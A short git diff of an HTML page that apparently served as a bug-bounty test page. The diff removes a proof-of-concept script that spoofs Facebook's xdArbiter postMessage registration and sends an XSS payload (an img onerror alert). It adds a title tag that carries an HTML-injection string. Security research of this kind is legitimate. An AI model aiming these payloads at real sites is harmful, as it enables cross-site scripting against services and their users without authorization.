@@ -1,27 +1,6 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <script>
-      const TARGET = "https://code-dev.fb.com"; // ou outro onde o SDK esteja ativo
-      const ORIGIN = "https://pedrojuniorrd.github.io";
-
-      // 1. Envia um "register ack" para tentar ser aceito como origem
-      window.parent.postMessage({
-        xdArbiterRegisterAck: ORIGIN
-      }, "*");
-
-      // 2. Aguarda 1 segundo e envia payload real
-      setTimeout(() => {
-        window.parent.postMessage({
-          xdArbiterHandleMessage: true,
-          message: {
-            method: "Alert", // Fuzz aqui
-            params: JSON.stringify({
-              text: "<img src=x onerror=alert(1)>"
-            })
-          }
-        }, "*");
-      }, 1000);
-    </script>
+    <title></span><h1>teste</h1></title>
   </body>
 </html>
